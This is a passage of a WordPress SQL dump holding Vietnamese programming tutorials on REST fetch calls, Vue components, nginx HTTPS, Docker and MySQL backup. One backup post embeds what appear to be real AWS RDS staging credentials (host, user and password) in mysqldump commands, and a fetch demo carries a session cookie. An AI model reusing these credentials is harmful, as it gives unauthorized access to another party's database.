(1046, 1, '2021-06-09 20:50:48', '2021-06-09 13:50:48', '<h2>1. Các phương thức cơ bản</h2>\r\n<table>\r\n<tbody>\r\n<tr>\r\n<td>Methods</td>\r\n<td>URLs</td>\r\n<td>Actions</td>\r\n</tr>\r\n<tr>\r\n<td>GET</td>\r\n<td>/products</td>\r\n<td>findAll()</td>\r\n</tr>\r\n<tr>\r\n<td>GET</td>\r\n<td>/products?categoryID=123&amp;page=1</td>\r\n</tr>\r\n<tr>\r\n<td>GET</td>\r\n<td>/products/:id</td>\r\n<td>findByID() findOne()</td>\r\n</tr>\r\n<tr>\r\n<td>POST</td>\r\n<td>/products/add</td>\r\n<td>addOne()</td>\r\n</tr>\r\n<tr>\r\n</tr>\r\n<tr>\r\n<td>PATCH</td>\r\n<td>/products/update/:id</td>\r\n<td>updateOne()</td>\r\n</tr>\r\n<tr>\r\n<td>PATCH</td>\r\n<td>/products/remove/:id</td>\r\n<td>removeOne()</td>\r\n</tr>\r\n<tr>\r\n<td>PATCH</td>\r\n<td>/products/restore/:id</td>\r\n<td>restoreOne()</td>\r\n</tr>\r\n<tr>\r\n</tr>\r\n<tr>\r\n<td>PATCH</td>\r\n<td>/products/removeList</td>\r\n<td>removeList()</td>\r\n</tr>\r\n<tr>\r\n<td>PATCH</td>\r\n<td>/products/restoreList</td>\r\n<td>restoreList()</td>\r\n</tr>\r\n<tr>\r\n</tr>\r\n<tr>\r\n<td>PUT</td>\r\n<td>\r\n<div>\r\n<div>/products/replace</div>\r\n</div>\r\n</td>\r\n<td>\r\n<div>\r\n<div>replaceOne()</div>\r\n</div>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>DELETE</td>\r\n<td>/products/destroy/:id</td>\r\n<td>destroyOne()</td>\r\n</tr>\r\n<tr>\r\n<td>DELETE</td>\r\n<td>/products/destroyList</td>\r\n<td>destroyList()</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n\r\n<h2>2. Demo Fetch</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n    <title>Resful API</title>\r\n</head>\r\n\r\n<body>\r\n    <div>\r\n        <button onclick=\"getAPI()\">Get Users</button>\r\n        <button onclick=\"postAPI()\">Post Login</button>\r\n        <button onclick=\"putAPI()\">Put User</button>\r\n        <button onclick=\"patchAPI()\">Patch User</button>\r\n        <button onclick=\"deleteAPI()\">Delete User</button> <br>\r\n\r\n        <button onclick=\"postAPI2()\">Post Login 2</button>\r\n    </div>\r\n\r\n    <script>\r\n        const getAPI = async () => {\r\n            try {\r\n                let url = \'https://reqres.in/api/users?page=2\';\r\n                let response = await fetch(url);\r\n                console.log(response);\r\n                let responseJSON = await response.json();\r\n                console.log(responseJSON);\r\n            } catch (error) {\r\n                console.log(\'Failed to fetch data !!!\', error.message);\r\n            }\r\n        }\r\n\r\n        const postAPI = async () => {\r\n            try {\r\n                let config = {\r\n                    method: \'POST\',\r\n                    body: JSON.stringify({ email: \"eve.holt@reqres.in\", password: \"cityslicka\", }),\r\n                    headers: {\r\n                        \'Content-Type\': \'application/json\',\r\n                    },\r\n                }\r\n                let url = \'https://reqres.in/api/login\';\r\n                let response = await fetch(url, config);\r\n                console.log(response);\r\n                let responseJSON = await response.json();\r\n                console.log(responseJSON);\r\n            } catch (error) {\r\n                console.log(\'Failed to fetch data !!!\', error.message);\r\n            }\r\n        }\r\n\r\n        const postAPI2 = async () => {\r\n            try {\r\n                let url = \"https://learn-api.jmaster.io:8443/api/login\";\r\n                let config = {\r\n                    method: \'POST\',\r\n                    headers: new Headers({\r\n                        \'Content-Type\': \"application/x-www-form-urlencoded\",\r\n                        \'Cookie\': \"JSESSIONID=B41705BC2C08E0B2A4CF1338348333CE\",\r\n                    }),\r\n                    body: new URLSearchParams({\r\n                        \'username\': \'0123456789\',\r\n                        \'password\': \'123456\',\r\n                    }),\r\n                    redirect: \'follow\'\r\n                };\r\n                let response = await fetch(url, config);\r\n                console.log(response);\r\n                let responseJSON = await response.json();\r\n                console.log(responseJSON);\r\n            } catch (error) {\r\n                console.log(\'Failed to fetch data !!!\', error.message);\r\n            }\r\n        }\r\n\r\n        const putAPI = async () => {\r\n            try {\r\n                let config = {\r\n                    method: \'PUT\',\r\n                    body: JSON.stringify({ name: \"James\", job: \"Student\", }),\r\n                    headers: {\r\n                        \'Content-Type\': \'application/json\',\r\n                    },\r\n                }\r\n                let url = \'https://reqres.in/api/users/2\';\r\n                let response = await fetch(url, config);\r\n                console.log(response);\r\n                let responseJSON = await response.json();\r\n                console.log(responseJSON);\r\n            } catch (error) {\r\n                console.log(\'Failed to fetch data !!!\', error.message);\r\n            }\r\n        }\r\n\r\n        const patchAPI = async () => {\r\n            try {\r\n                let config = {\r\n                    method: \'PUT\',\r\n                    body: JSON.stringify({ name: \"Robert\", job: \"Farming\", }),\r\n                    headers: {\r\n                        \'Content-Type\': \'application/json\',\r\n                    },\r\n                }\r\n                let url = \'https://reqres.in/api/users/2\';\r\n                let response = await fetch(url, config);\r\n                console.log(response);\r\n                let responseJSON = await response.json();\r\n                console.log(responseJSON);\r\n            } catch (error) {\r\n                console.log(\'Failed to fetch data !!!\', error.message);\r\n            }\r\n        }\r\n\r\n        const deleteAPI = async () => {\r\n            try {\r\n                let config = {\r\n                    method: \'DELETE\',\r\n                }\r\n                let url = \'https://reqres.in/api/users/2\';\r\n                let response = await fetch(url, config);\r\n                let responseJSON = await response.json();\r\n                console.log(response);\r\n                console.log(responseJSON);\r\n            } catch (error) {\r\n                console.log(\'Failed to fetch data !!!\', error.message);\r\n            }\r\n        }\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'RESTful API - 1. Cơ bản', '', 'publish', 'open', 'open', '', 'restful-api-1-co-ban', '', '', '2022-08-12 06:25:03', '2022-08-12 06:25:03', '', 0, 'https://duycode.com/?p=1046', 0, 'post', '', 0),
(1097, 1, '2021-07-15 02:00:50', '2021-07-14 19:00:50', '<pre>\r\ndocker run -d --name my-mariadb -e MARIADB_ROOT_PASSWORD=abc123 mariadb:10.10.2\r\ndocker exec -it my-mariadb bash\r\n\r\n// Test connect\r\nmysql --help\r\nmysql -u root --password=abc123\r\nmysql --host host.docker.internal --port 3306 -u root --password=password\r\nmysql --host staging-v22.cxihrjsldwdw.ap-southeast-1.rds.amazonaws.com --port 3306 -u cplstaging --password=cplstagingdeptrai2022XX\r\n> SHOW DATABASES;\r\n\r\n// Backup\r\nmysqldump --help\r\n## Dump database adminv3 with table user\r\nmysqldump --host staging-v22.cxihrjsldwdw.ap-southeast-1.rds.amazonaws.com --port 3306 -u cplstaging --password=cplstagingdeptrai2022XX adminv3 user > data-dump.sql\r\n## Dump database adminv3 with table user and table migration\r\nmysqldump --host staging-v22.cxihrjsldwdw.ap-southeast-1.rds.amazonaws.com --port 3306 -u cplstaging --password=cplstagingdeptrai2022XX adminv3 user migrations > data-dump.sql\r\n## Dump database adminv3 with table admin_action_log and condition\r\nmysqldump --host staging-v22.cxihrjsldwdw.ap-southeast-1.rds.amazonaws.com --port 3306 -u cplstaging --password=cplstagingdeptrai2022XX adminv3 admin_action_log --where=\"created_at > 1669707228000\" > data-dump.sql\r\n\r\n## Note: use \">> data-dump.sql\". It will append the previous dump file.\r\n\r\n// Restore to database db_admin_backend\r\nmysql --host host.docker.internal --port 3306 -u root --password=password db_admin_backend < data-dump.sql\r\n</pre>', 'MySQL and MariaSQL - Backup and Restore', '', 'publish', 'open', 'open', '', 'mysql-and-mariasql-backup-and-restore', '', '', '2022-11-30 07:59:57', '2022-11-30 07:59:57', '', 0, 'https://duycode.com/?p=1097', 0, 'post', '', 0),
(1106, 1, '2021-06-10 04:00:56', '2021-06-09 21:00:56', '<h1>I. Tổng quan</h1>\n<h2>1. Gửi dữ liệu từ Component-cha sang Component-con</h2>\n<pre>\n//Component cha dùng \"v-bind\" vào thẻ component con để gắn data gửi đi\n<ChildComponent :child_receive=\"parent_send\"></ChildComponent>\n\n//Component con nhận bằng \"prop\"\nprops: {\n    child_receive: {\n        type: String,\n        required: false,\n        default: \"Nothing !!!\"\n    }\n},\n</pre>\n\n<h2>2. Gửi dữ liệu từ Component-con về Component-cha</h2>\n<h3>2.1. Cách 1: Dùng event</h3>\na. Component con truyền data bằng \"$emit\"\n<pre>\n//Kích hoạt sự kiện gửi về paren bằng button\n<button @click=\"sendParent\">Send To Parent</button>\n\n//Param 1 là tên sự kiện: \"takeOnChild\"\n//Param 2 là data gửi đi: \"this.child_send\"\nmethods: {\n    sendParent() {\n        console.log(\"Start Child Send To Parent !!!\");\n        this.$emit(\"takeOnChild\", this.child_send);\n        console.log(\"End Send Parent !!!\");\n    }\n}\n</pre>\nb. Component cha kích hoạt event bằng \"v-on\", nhận dữ liệu thông qua biến \"$event\" trong hàm sự kiện\n<pre>\n//TH1: Nhận trực tiếp biến event\n<ChildComponent @takeOnChild=\"parent_receive = $event\"></ChildComponent>\n\n//TH2: Nhận thông qua methods\n<ChildComponent @takeOnChild=\"receiveOnChild\"></ChildComponent>\n\n//Sau đó đọc biến \"$event\" bằng \"parameter\" của hàm, trường hợp này là biến data\nmethods: {\n    receiveOnChild(data) {\n        console.log(\"Parent take Data from Child\");\n        this.parent_receive = data;\n    }\n},\n</pre>\n<h3>2.2. Cách 2: Dùng callback funtion</h3>\na. Component cha gửi callback về cho component con\n<pre>\n//Component cha dùng function callback để set dữ liệu\nmethods: {\n    callbackParent(data) {\n        this.parent_receive = data;\n    }\n},\n\n//Component cha dùng \"v-bind\" vào thẻ component con để gắn funtion gửi đi\n<ChildComponent :child_callback=\"callbackParent\"></ChildComponent>\n</pre>\n\nb. Component con nhận function callback\n<pre>\n//Nhận function callback thông qua props\nprops: {\n    child_callback: {\n        type: Function,\n    }\n},\n\n//Set data cho paren thông qua params của funtion callback\n<button @click=\"child_callback(child_send)\">Send To Parent By Callback</button>\n</pre>\n\n<h1>II. Demo</h1>\n<h2>1. Tại Component cha</h2>\n-- Tại file ./src/components/ParentComponent.vue\n<pre>\n<template>\n    <div>\n        <input type=\"text\" v-model=\"parent_send\" />\n        <p>Parent Send: {{ parent_send }}</p>\n        <p>Parent Receive: {{ parent_receive }}</p>\n        <ChildComponent\n            :child_receive=\"parent_send\"\n            :child_callback=\"callbackParent\"\n            @takeOnChild=\"receiveOnChild\"\n        ></ChildComponent>\n        <!-- <ChildComponent @takeOnChild=\"parent_receive = $event\"></ChildComponent> -->\n    </div>\n</template>\n\n<script>\nimport ChildComponent from \"./ChildComponent.vue\";\nexport default {\n    data: function() {\n        return {\n            parent_send: \"123\",\n            parent_receive: \"0\"\n        };\n    },\n    methods: {\n        receiveOnChild(data) {\n            console.log(\"Parent take Data from Child\");\n            this.parent_receive = data;\n        },\n        \n        callbackParent(data) {\n            this.parent_receive = data;\n        }\n    },\n    components: {\n        ChildComponent: ChildComponent\n    }\n};\n</script>\n<style scoped></style>\n\n</pre>\n\n\n<h2>2. Tại Component con</h2>\n-- Tại file ./src/components/ChildComponent.vue\n<pre>\n<template>\n    <div>\n        <hr />\n        <input type=\"text\" v-model=\"child_send\" />\n        <button @click=\"sendParent\">Send To Parent</button>\n        <button @click=\"child_callback(child_send)\">Send To Parent By Callback</button>\n        <p>Child Send: {{ child_send }}</p>\n        <p>Child Receive: {{ child_receive }}</p>\n    </div>\n</template>\n\n<script>\nexport default {\n    props: {\n        child_receive: {\n            type: String,\n            required: false,\n            default: \"Nothing !!!\"\n        },\n        child_callback: {\n            type: Function,\n        }\n    },\n    data: function() {\n        return {\n            child_send: \"xyz\"\n        };\n    },\n    methods: {\n        sendParent() {\n            console.log(\"Start Child Send To Parent !!!\");\n            this.$emit(\"takeOnChild\", this.child_send);\n            console.log(\"End Send Parent !!!\");\n        },\n    }\n};\n</script>\n<style scoped></style>\n\n</pre>\n', 'VueJS - Component: 2. Send Data giữa component \'cha\' và \'con\'', '', 'publish', 'open', 'open', '', 'vuejs-component-2-send-data-giua-component-cha-va-con', '', '', '2021-06-10 04:00:56', '2021-06-09 21:00:56', '', 0, 'https://duycode.com/?p=1106', 0, 'post', '', 0),
(1114, 1, '2021-06-10 00:00:33', '2021-06-09 17:00:33', '<h3>./mh-nginx/conf.d/default.conf</h3>\r\n<pre>\r\nserver {\r\n    listen       443 ssl;\r\n    server_name  localhost;\r\n\r\n    ssl_certificate           /etc/nginx/ssl/cert.pem;\r\n    ssl_certificate_key       /etc/nginx/ssl/key.pem;\r\n    ssl_protocols             TLSv1.2 TLSv1.3;\r\n    ssl_prefer_server_ciphers on;\r\n    ssl_ciphers               \'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH\';\r\n\r\n    location / {\r\n        root   /etc/nginx/dist;\r\n        index  index.html index.htm;\r\n    }\r\n}\r\n</pre>\r\n\r\n<h3>./docker-compose.yml</h3>\r\n<pre>\r\nversion: \'3.3\'\r\n \r\nservices:\r\n  nginx:\r\n    container_name: mhc_nginx\r\n    image: nginx:1.23.1-alpine\r\n    restart: always\r\n    volumes:\r\n      - ./mh-nginx/conf.d/:/etc/nginx/conf.d/\r\n      - ./mh-nginx/ssl/:/etc/nginx/ssl/\r\n      - ./mh-nginx/dist/:/etc/nginx/dist/\r\n    ports:\r\n      - \"7750:443\"\r\n</pre>\r\n\r\n<h3>Start</h3>\r\n- Tạo key SSL\r\n<pre>\r\nopenssl req -days 3650 -x509 -newkey rsa:2048 -sha256 -nodes -keyout ./mh-nginx/ssl/key.pem -out ./mh-nginx/ssl/cert.pem -subj \"/C=/ST=/L=/O=/OU=web/CN=medihome.vn\"\r\n</pre>\r\n\r\n- Stop port 7750 in your computer\r\n- Run docker: `docker compose up -d`\r\n\r\n- Try access: `https://localhost:7750` to test', 'Cài đặt https cho localhost với nginx và openssl', '', 'publish', 'open', 'open', '', 'cai-dat-https-cho-localhost-voi-nginx-va-openssl', '', '', '2022-11-15 01:13:07', '2022-11-15 01:13:07', '', 0, 'https://duycode.com/?p=1114', 0, 'post', '', 0),
(1120, 1, '2023-07-01 02:00:00', '2023-07-01 02:00:00', '<h3>A.Các chế  độ lock </h3>\r\n<blockquote>UPDATE user SET username = \'Bob\' WHERE id = \'1\';	</blockquote>\r\n- Exclusive lock (lock độc quyền): Row user có id = 1 sẽ bị exclusive lock ==> Các transaction khác phải chờ câu lệnh trên thực hiện xong\r\n- Share lock (lock chia sẻ): Bảng user sẽ bị share lock nên các transaction khác sẽ không thể cập nhật cấu trúc của nó (vì để thay đổi cấu trúc bảng thì cần phải tiến hành exclusive lock bảng). Tuy nhiên các transaction khác vẫn có thể thay đổi các dòng khác của bảng employees (khi đó bảng employees sẽ bị nhiều share lock).\r\n\r\n<h3>B.Các loại lock </h3>\r\n1. DDL lock (lock cấu trúc): có chức năng bảo vệ cấu trúc của các đối tượng trong schema, ví dụ như bảng, view,\r\n2. DML lock (lock dữ liệu):\r\n- Thường thì SELECT không phải đợi UPDATE\r\n- UPDATE phải đợi nhau nếu cùng ghi trên 1 dòng\r\n', 'SQL Transaction – 2 Các loại Lock', '', 'publish', 'open', 'open', '', 'sql-transaction-2-cac-loai-lock', '', '', '2023-07-24 03:37:11', '2023-07-24 03:37:11', '', 0, 'https://duycode.com/?p=1120', 0, 'post', '', 0),
(1133, 1, '2021-06-10 01:00:33', '2021-06-09 18:00:33', '<h2>1. Lifecycle trong Vue</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\" />\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <title>Lifecycle Vue</title>\n    </head>\n\n    <body>\n        <div id=\"app\">\n            <h2>Hello Vue !!!</h2>\n            <p>Updated: {{current_time}}</p>\n            <button @click=\"current_time = new Date()\">\n                Update Data\n            </button>\n            <button @click=\"destroyVue\">Destroy Vue</button>\n        </div>\n        <script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n        <script>\n            let app = new Vue({\n                el: \"#app\",\n                data() {\n                    return {\n                        current_time: \"Not yet\"\n                    };\n                },\n                methods: {\n                    destroyVue: function() {\n                        this.$destroy();\n                    }\n                },\n                beforeCreate: function() {\n                    console.log(\"beforeCreate !\");\n                },\n                created: function() {\n                    console.log(\"created !\");\n                },\n                beforeMount: function() {\n                    console.log(\"beforeMount !\");\n                },\n                mounted: function() {\n                    console.log(\"mounted !\");\n                },\n                beforeUpdate: function() {\n                    console.log(\"beforeUpdate !\");\n                },\n                updated: function() {\n                    console.log(\"updated !\");\n                },\n                beforeDestroy: function() {\n                    console.log(\"beforeDestroy !\");\n                },\n                destroyed: function() {\n                    console.log(\"destroyed !\");\n                }\n            });\n        </script>\n    </body>\n</html>\n\n</pre>\n\n<h2>2. Lifecycle trong Component</h2>\n-- Biến trong data chưa được khởi tạo khi ở hàm \"beforeCreate\"\n-- Khi không có thẻ \"keep-alive\" -> mỗi lần switch component -> component cũ sẽ bị \"destroyed\"\n-- Khi có thẻ \"keep-alive\" -> mỗi lần switch component -> component cũ sẽ bị \"deactivated\"\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n    <body>\n        <div id=\"app\">\n            <button @click=\"select_component = \'component_a\'\">\n                Show Component A\n            </button>\n            <button @click=\"select_component = \'component_b\'\">\n                Show Component B\n            </button>\n            <!-- <component :is=\"select_component\"></component> -->\n            <keep-alive>\n                <component :is=\"select_component\"></component>\n            </keep-alive>\n        </div>\n        <script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n        <script>\n            //object chứa những key dùng chung ở các component khác nhau\n            let component_mixins = {\n                template: \"<div><p>This is {{text}}</p></div>\",\n\n                beforeCreate: function() {\n                    console.log(this.text + \" - beforeCreate !\");\n                },\n                created() {\n                    console.log(this.text + \" - created !\");\n                },\n                beforeMount() {\n                    console.log(this.text + \" - beforeMount !\");\n                },\n                mounted() {\n                    console.log(this.text + \" - mounted !\");\n                },\n                beforeUpdate() {\n                    console.log(this.text + \" - beforeUpdate !\");\n                },\n                updated() {\n                    console.log(this.text + \" - updated !\");\n                },\n                beforeDestroy() {\n                    console.log(this.text + \" - beforeDestroy !\");\n                },\n                destroyed() {\n                    console.log(this.text + \" - destroyed !\");\n                },\n                activated() {\n                    console.log(this.text + \" - activated !\");\n                },\n                deactivated() {\n                    console.log(this.text + \" - deactivated !\");\n                }\n            };\n\n            let component_a = {\n                //sử dụng mixins để merge với component_mixins, tránh phải viết lại code\n                mixins: [component_mixins],\n                data: function() {\n                    return {\n                        text: \"Component-A\"\n                    };\n                },\n            };\n            let component_b = {\n                //sử dụng mixins để merge với component_mixins, tránh phải viết lại code\n                mixins: [component_mixins],\n                data: function() {\n                    return {\n                        text: \"Component-B\"\n                    };\n                },\n            };\n\n            let app = new Vue({\n                el: \"#app\",\n                data: function() {\n                    return {\n                        select_component: \"component_a\"\n                    };\n                },\n                components: {\n                    component_a,\n                    component_b\n                }\n            });\n        </script>\n    </body>\n</html>\n</pre>\n\n<h2>3. Sơ đồ Lifecycle</h2>\n<img src=\"https://vuejs.org/images/lifecycle.png\" alt=\"lifecycle vue\" />', 'VueJS - Lifecycle Vue & Lifecycle Component', '', 'publish', 'open', 'open', '', 'vuejs-lifecycle-vue-lifecycle-component', '', '', '2021-06-10 01:00:33', '2021-06-09 18:00:33', '', 0, 'https://duycode.com/?p=1133', 0, 'post', '', 0),
(1137, 1, '2022-06-15 09:02:54', '2022-06-15 09:02:54', '<h2>1. Tổng quan</h2>\r\nCấu trúc thư mục trông như sau:\r\n<pre>\r\nmedihome-vn\r\n├── mh-nodejs\r\n│   ├── Dockerfile\r\n│   ├── package-lock.json\r\n│   ├── package.json\r\n│   └── main.js\r\n│\r\n├── mh-nginx\r\n│   ├── Dockerfile\r\n│   └── default.conf\r\n</pre>\r\n\r\n<h2>2. Server Nodejs: mh-nodejs</h2>\r\n2.1. Init Nodejs\r\n<pre>\r\n// Có thể sử dụng chuẩn phiên bản cho chắc\r\nnvm install 16.16\r\nnvm use 16.16\r\n\r\ncd /home/duy.ngo/Project/medihome-vn/mh-nodejs\r\nnpm init -y\r\nnpm install express nodemon\r\n\r\n// Thêm vào mh-nodejs/package.json\r\n\"start\": \"nodemon main.js\",\r\n</pre>\r\n\r\n2.2. Tạo file mh-nodejs/main.js\r\n<pre>\r\nconst express = require(\'express\');\r\nconst app = express();\r\n\r\napp.get(\'/\', (req, res) => {\r\n    res.json(\"Hello world\");\r\n})\r\napp.listen(8888, () => {\r\n    console.log(\'Example app listening at PORT 8888\');\r\n})\r\n</pre>\r\n-- Có thể chạy <note>npm i</note> sau đó run thử: <note>npm start</note>\r\n\r\n2.3. Tạo file Docker ở thư mục gốc\r\n<pre>\r\nFROM node:alpine\r\nWORKDIR /app\r\nCOPY package.json ./\r\nCOPY package-lock.json ./\r\nCOPY ./ ./\r\nRUN npm i\r\nCMD [\"npm\", \"run\", \"start\"]\r\n</pre>\r\n\r\n2.4. Tạo image và run container nào :3\r\n<pre>\r\n// Tạo image: -f: đường dẫn file, -t: name:tag, . làm việc với thư mục nào\r\ndocker build -f ./mh-nodejs/Dockerfile -t server-nodejs:1.0.0 ./mh-nodejs/\r\n\r\n// Run thử với cổng ở local là 9999\r\ndocker run -it --name my-nodejs -p 9999:8888 server-nodejs:1.0.0\r\n\r\n</pre>\r\n-- Kết quả <note>http://localhost:9999</note>', 'Docker – 9.2. Nginx - Reverse Proxy', '', 'publish', 'open', 'open', '', 'docker-9-2-nginx-reverse-proxy', '', '', '2022-08-11 09:41:19', '2022-08-11 09:41:19', '', 0, 'https://duycode.com/?p=1137', 0, 'post', '', 0),
(1175, 1, '2021-06-10 05:00:35', '2021-06-09 22:00:35', 'Khi 2 component cùng cha, có thể send data cho nhau bằng cách thông qua component cha\nTuy nhiên, với 2 component khác xa nhau. Có thể dùng 1 đối tượng Vue để tạo sự kiện qua nó\n\n<h2>1. Tại file ./src/main.js</h2>\n<pre>\nimport Vue from \'vue\'\nimport App from \'./App.vue\'\n\n//Tạo 1 instance như 1 đối tượng vận chuyển data, cần gọi trước #app (ở dưới), \nexport const eventBus = new Vue();\n\nnew Vue({\n  el: \'#app\',\n  render: h => h(App)\n})\n</pre>\n\n<h2>2. Tại Component thứ 1 gửi data</h2>\n<pre>\n//Tạo button để bắt đầu sự kiện \"sendOtherChild\"\n<template>\n    <div>\n        <input type=\"text\" v-model=\"child_send\" /><br />\n        <button @click=\"sendOtherChild\">Send To Other Children</button>\n        <p>Child-1 Send: {{ child_send }}</p>\n    </div>\n</template>\n\n<script>\n//Lấy đối tượng \"eventBus\"\nimport { eventBus } from \"../../main.js\";\n\nexport default {\n    //Giả sử data gửi đi là biến: \"child_send\"\n    data: function() {\n        return {\n            child_send: \"xyz\"\n        };\n    },\n    methods: {\n        //Dùng \"$emit\" của \"eventBus\" để gửi sự kiện đi\n        //\"takeOtherChild\": tên sự kiện\n        //\"this.child_send\": data gửi đi\n        sendOtherChild() {\n            eventBus.$emit(\"takeOtherChild\", this.child_send);\n        }\n    },\n    \n};\n</script>\n<style scoped></style>\n</pre>\n\n<h2>2. Tại Component thứ 2 nhận data</h2>\n<pre>\n<template>\n    <div>\n        <p>Other Child Receive: {{ other_child_reveive }}</p>\n    </div>\n</template>\n\n<script>\n//Lấy đối tượng \"eventBus\"\nimport { eventBus } from \"../../main.js\";\n\nexport default {\n    //Giả sử data nhận về sẽ cập nhật vào biến \"other_child_reveive\";\n    data: function() {\n        return {\n            other_child_reveive: \"0\"\n        };\n    },\n\n    //Cần cho phép đối tượng eventBus được thực hiện lắng nghe sự kiện ngay khi Component khởi tạo\n    //Nếu để vào methods chẳng hạn, thì phải đợi methods run rồi mới bắt đầu lắng nghe\n    //Như vậy trước khi methods run, nếu có sự kiện xảy ra rồi thì sẽ không lắng nghe được\n    //Vì vậy cần để ở \"created\" luôn\n    created() {\n        eventBus.$on(\"takeOtherChild\", data => {\n            this.other_child_reveive = data;\n        });\n    }\n};\n</script>\n<style scoped></style>\n\n</pre>', 'VueJS – Component: 3. Send Data giữa 2 component bất kỳ', '', 'publish', 'open', 'open', '', 'vuejs-component-3-send-data-giua-2-component-bat-ky', '', '', '2021-06-10 05:00:35', '2021-06-09 22:00:35', '', 0, 'https://duycode.com/?p=1175', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1187, 1, '2021-06-10 02:00:38', '2021-06-09 19:00:38', '<h1>I. Component</h1>\n<h2>1. Template: </h2>\n<pre>\n//1. Get dữ liệu, có thể dùng funtion đơn giản\n{{demo_var}}\n{{demo_var == 1 ? currentScore : 0 }}\n\n//2. Set attribute\nv-bind:id\nv-bind:class\n:class=\"{class1: true, class2: false}\"\nv-bind:style=\"{backgroundColor: color_red, width: \'100px\'}\"\nv-bind:style=\"[customStyles, {width: \'100px\'}]\"\n\n//3. Two way biding, v-model.lazy: đợi viết xong input mới đổ dữ liệu\nv-model = \"demo_var\"\nv-model.lazy = \"demo_var\"\n\n//4.1. Conditions \nv-if=\"true\"\nv-else-if=\"demo_var=== \'B\'\"\nv-else\n\n//4.2. Detach với v-show -> có thay đổi atribute\nv-show=\"true\"\nv-hide=\"true\"\n\n//5. Render list\n<li v-for=\"n in 10\">{{n}}</li> //hiện từ 1 đến 10\n<li v-for=\"item in demo_array\">{{item}}</li>\n<li v-for=\"(item, index) in demo_array\" :key=\"item\">{{index}} : {{item}}</li>\n<li v-for=\"(value, key) in demo_object\">{{key}} : {{value}}</li>\n<li v-for=\"(value, key, index) in demo_object\">{{index}} - {{key}} : {{value}}</li>\n\n//6.1. Set event: event có thể là 1 biến, 1 function hoặc 1 event\n@click = \"demo_var= !demo_var\"\nv-on:click = \"demo_funtion\"\n<input v-on:input=\"$emit(\'handleChangeFinalScore\', $event)\" type=\"text\">\n\n//6.2. Event modifiers: sử dụng đơn giản cho event.preventDefault(), event.stopPropagation()\n<a v-on:click.stop=\"doThis\"></a>\n<form v-on:submit.prevent=\"onSubmit\"></form>\n\n//6.3. Key event modifiers: sử dụng keycode\n<input v-on:keyup.enter=\"submit\">\n<input v-on:keyup.13=\"submit\">\n<input v-on:keyup.alt.67=\"clear\">  //Alt + C\n \n//6.4. Event native: với những element được append sau khi DOM khởi tạo, event thông thường sẽ không nhận được\n//Vì vậy, cần dùng \"event.native\"\n<item-component v-for=\"(item,index) in items\" :key=\"index\" @click.native=\"itemAction(index)\"></item-component>\n\n\n//7. Ref -> Sử dụng bằng cách: this.$refs.demoRef --> đã query được element\n<div ref=\"demoRef\"></div\n\n//8.1. Slot trong component, ví dụ component <appCard>\n    <slot></slot> //slot mặc định -> các slot không có name được ném vào đây\n    <slot name=\"demo\">Demo Text</slot> //slot với giá trị có sẵn\n    <slot v-for=\"n in 10\" :name=\"\'slot\' + n\"></slot> //slot có name\n\n//8.2. Slot ở parent\n<appCard>\n    <p>Thẻ này không có name, được ném vào slot mặc định</p>\n    <p name=\"demo\">Thẻ này có name, được ném vào slot có name là \'demo\'</p>\n    <p v-for=\"n in 10\" :slot=\"\'slot\'+n\">Number: {{ n }}</p>\n</appCard>\n\n//9. <template> : dùng được v-if,v-for, nhưng không dùng được v-show (vì có tạo attribute style)\n<template v-if=\"true\">\n    <p>Hello world</p>\n</template>\n\n\n//10.1. <component>: 2 cách viết giống nhau, do trình tự biên dịch của Vue đổi chữ viết hoa thành viết thường và thêm dấu gạch ngang\n<demoComponent></demoComponent>\n<demo-component></demo-component>\n\n//10.2. Kiểm tra component -> nếu var_name == \"demoComponent\" thì hiển thị Component có tên \"demoComponent\"\n//Tuy nhiên nếu khi thay đổi var_name == \"demoComponent2\" thì Component có tên \"demoComponent\" sẽ bị destroy\n<component :is=\"var_name\"></component>\n\n//10.2. Để tránh tình trạng destroy thì thêm thẻ <keep-alive>\n<keep-alive>\n    <component :is=\"var_name\"></component>\n</keep-alive>\n</pre>\n\n<em><strong>****. Những lưu ý về v-model</strong></em>\n<pre>\n//1. v-model trong input ==> bản chất là sự kết hợp của \":value\" và \"@input\"\n//2 câu lệnh ở dưới tương đương nhau\n<input type=\"text\" v-model=\"demo_var\" />\n<input type=\"text\" :value = \"demo_var\" @input = \"demo_var = $event.target.value\" />\n\n//2. v-model có hàm get và set, có thể thay đổi hàm đó bằng computed\n//Lưu ý: Hàm set sẽ chạy trước hàm get\n<input type=\"text\" v-model=\"computed_customValue\" />\n<script>\n    computed: {\n        computed_customValue: {\n            set(value) {\n                //Khi gõ: \"a\" thì giá trị \"customValue\" là \"ax\", mọi nơi {{customValue }} đều show ra \"ax\"\n                this.customValue = value + \"x\";\n            }\n            get() {\n                //Khi gõ: \"a\" => sẽ hiển thị \"axy\", Lý do\n                //Khi gõ: \"a\" => customValue = \"ax\" do được chạy \"set()\" ở hàm set phía trên\n                //\"ax\"==> tiếp tục show ra \"axy\" do được chạy hàm \"get()\"\n                return this.customValue+ \"y\";\n            },\n        }\n    },\n</script>\n</pre>\n\n<h2>2. Script</h2>\n<pre>\nlet component_object = {\n    el: \'#app\',\n\n    //lấy data từ component cha\n    props: {\n        child_receive: {\n            type: String,\n            required: false,\n            default: \"Nothing !!!\"\n        },\n    },\n\n    data: {\n        